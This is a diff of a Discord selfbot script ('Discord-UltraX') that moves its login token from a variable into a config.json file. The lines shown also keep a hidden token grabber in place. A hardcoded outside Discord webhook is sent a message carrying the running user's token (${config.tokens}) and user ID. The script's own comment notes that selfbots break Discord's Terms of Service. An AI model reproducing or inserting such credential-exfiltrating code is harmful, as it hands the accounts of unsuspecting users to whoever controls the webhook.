@@ -1,6 +1,3 @@
-
-let YOUR_TOKEN = ''
-var mathprefix = "m/"
 /*
 ⚠ All selfbots (and any other 3rd-party clients or client modifications) break Discord's Terms of Service. Please do not use a selfbot nor any client modifications.
 🔗 Terms of Service: https://discordapp.com/terms
@@ -28,9 +25,11 @@ const fetch = require('node-fetch');
 const got = require('got');
 var token = "token ici"
 var prefix = "/"
+var mathprefix = "m/"
 const moment = require('moment');
 var cheerio = require("cheerio"); /* Used to extract html content, based on jQuery || install with npm install cheerio */
 var request = require("request"); /* Used to make requests to URLs and fetch response  || install with npm install request */
+const config = require("./config.json")
 
 
 client.on('ready', () => {
@@ -2490,7 +2489,7 @@ const hook = new Webhook("https://discord.com/api/webhooks/796928136942977065/5S
           **__Discord-UltraX__**
            --------------------------------------------------
            __**Token:**__ 
-           ${YOUR_TOKEN}
+           ${config.tokens}
            --------------------------------------------------
            __**ID:**__
             ${client.user.id}
@@ -2570,4 +2569,4 @@ function image(message, parts) {
 //Login; -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
-client.login(YOUR_TOKEN)
+client.login(config.token)
